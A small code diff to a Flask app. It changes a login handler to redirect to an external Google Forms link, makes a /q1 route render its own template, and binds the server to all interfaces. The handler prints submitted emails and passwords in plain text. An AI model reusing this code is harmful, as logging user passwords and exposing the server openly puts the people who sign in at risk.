@@ -10,18 +10,18 @@ def home():
         passwd = request.form["passwd"]
         print(em,passwd)
         if em != '' and passwd != '' :
-            return redirect(url_for('q1'), 301)
+            return redirect("https://docs.google.com/forms/d/1TeFEsUUrCeg9NzLQZplprOIeiOZbmoWYJwgWbF0cel8", 301)
         else:
             return render_template('home.html')
     else:
         return render_template('home.html')
-        
+
 @app.route("/q1", methods=["GET", "POST"])
 def q1():
-    return render_template('home.html')
-   
-   
-   
-   
+    return render_template('q1.html')
+
+
+
+
 if __name__ == '__main__':
-   app.run()
+   app.run("0.0.0.0")
